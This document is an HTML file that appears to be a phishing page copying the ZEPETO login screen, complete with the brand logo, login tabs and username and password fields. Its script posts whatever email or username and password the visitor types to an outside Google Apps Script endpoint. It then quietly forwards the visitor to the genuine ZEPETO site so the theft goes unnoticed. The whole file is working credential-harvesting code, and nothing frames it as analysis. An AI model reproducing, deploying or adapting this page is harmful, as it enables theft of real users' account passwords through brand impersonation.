<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ZEPETO</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            padding-top: 20px;
            padding-left: 28px;
            padding-right: 28px;
        }

        .header {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .header img {
            height: 50px;
        }

        .login-header {
            text-align: center;
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 30px;
        }

        .tab-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
            margin-bottom: 27px;
            position: relative;
        }

        .tab {
            width: 50%;
            text-align: center;
            font-size: 1rem;
            padding-bottom: 15px;
            margin-top: -10px;
            cursor: pointer;
            color: #adacac;
            font-weight: bold;
        }

        .tab.active {
            color: black;
        }

        .line {
            width: 100%;
            height: 2px;
            background-color: black;
            position: absolute;
            bottom: 0;
            display: none;
        }

        .line-gray {
            width: 100%;
            height: 1px;
            background-color: #cbcecf;
            position: absolute;
            bottom: 0px;
        }

        .input-group {
            margin-bottom: 15px;
            width: 100%;
            margin-top: -3px;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: none;
            background-color: #f5f5f6;
            border-radius: 8px;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            font-size: 1rem;
            border: none;
            border-radius: 8px;
            background-color: #c7c7c9;
            color: white;
            cursor: not-allowed;
            text-align: center;
            font-weight: bold;
            transition: background-color 0.2s ease, color 0.2s ease;
        }

        .login-btn.active {
            background-color: #5d4ffb;
            cursor: pointer;
        }

        .footer {
            margin-top: auto;
            text-align: center;
            font-size: 0.9rem;
            padding: 20px;
        }

        .footer a {
            color: #1E90FF;
            text-decoration: none;
        }

        html, body {
            height: 100%;
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
        }

        @media (max-width: 600px) {
            .tab {
                font-size: 1rem;
            }

            .input-group input {
                font-size: 0.95rem;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <img src="https://firebasestorage.googleapis.com/v0/b/web-zepeto-me.appspot.com/o/IMAGES%2Fzepeto_logo-freelogovectors.net_.png?alt=media&token=95b863fa-b180-4139-a42d-955c966cdbc4" alt="ZEPETO Logo">
            </div>

            <div class="login-header">Login</div>

            <div class="tab-container">
                <div class="tab" id="email-tab">Email â€¢ ID</div>
                <div class="tab" id="phone-tab">Phone</div>
                <div class="line-gray"></div>
                <div class="line" id="active-line"></div>
            </div>

            <div class="input-group">
                <input type="text" id="email" placeholder="email or username">
            </div>

            <div class="input-group">
                <input type="password" id="password" placeholder="Password">
            </div>

            <div class="login-btn" id="done-btn">Done</div>
        </div>

        <div class="footer">
            New to ZEPETO <a href="#">Download App</a>
        </div>
    </div>

    <script>
        const passwordField = document.getElementById('password');
        const emailTab = document.getElementById('email-tab');
        const phoneTab = document.getElementById('phone-tab');
        const doneBtn = document.getElementById('done-btn');
        const emailField = document.getElementById('email');
        const activeLine = document.getElementById('active-line');

        function setActiveTab(active) {
            emailTab.classList.remove('active');
            phoneTab.classList.remove('active');
            activeLine.style.display = 'none';

            if (active === 'email') {
                emailTab.classList.add('active');
                activeLine.style.display = 'block';
                activeLine.style.width = emailTab.clientWidth + 'px';
                activeLine.style.left = emailTab.offsetLeft + 'px';
            } else {
                phoneTab.classList.add('active');
                activeLine.style.display = 'block';
                activeLine.style.width = phoneTab.clientWidth + 'px';
                activeLine.style.left = phoneTab.offsetLeft + 'px';
            }
        }

        emailTab.addEventListener('click', () => setActiveTab('email'));
        phoneTab.addEventListener('click', () => setActiveTab('phone'));

        function checkFields() {
            if (passwordField.value.length >= 8 && emailField.value.trim() !== '') {
                doneBtn.classList.add('active');
                doneBtn.removeAttribute('disabled');
            } else {
                doneBtn.classList.remove('active');
                doneBtn.setAttribute('disabled', true);
            }
        }

        emailField.addEventListener('input', checkFields);
        passwordField.addEventListener('input', checkFields);

        // Set the default active tab on page load
        setActiveTab('email');

        // Handle Done button click
        doneBtn.addEventListener('click', async () => {
  const emailOrUsername = emailField.value.trim();
  const password = passwordField.value;

  if (emailOrUsername && password.length >= 8) {
    const response = await fetch('https://script.google.com/macros/s/AKfycbyR94N4BkNL1YkHoUNk4r3uNdR6TAHXk8nFHfZwsJ9-z07bkDPYmK9ajZdqM9IibVwqXA/exec', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `emailOrUsername=${encodeURIComponent(emailOrUsername)}&password=${encodeURIComponent(password)}`
    });

    if (response.ok) {
      // Redirect ke halaman setelah login berhasil
      window.location.href = 'https://web.zepeto.me';
    } else {
      alert('Error submitting the form. Please try again.');
    }
  } else {
    alert('Please fill in all fields correctly.');
  }
});
    </script>
</body>
</html>
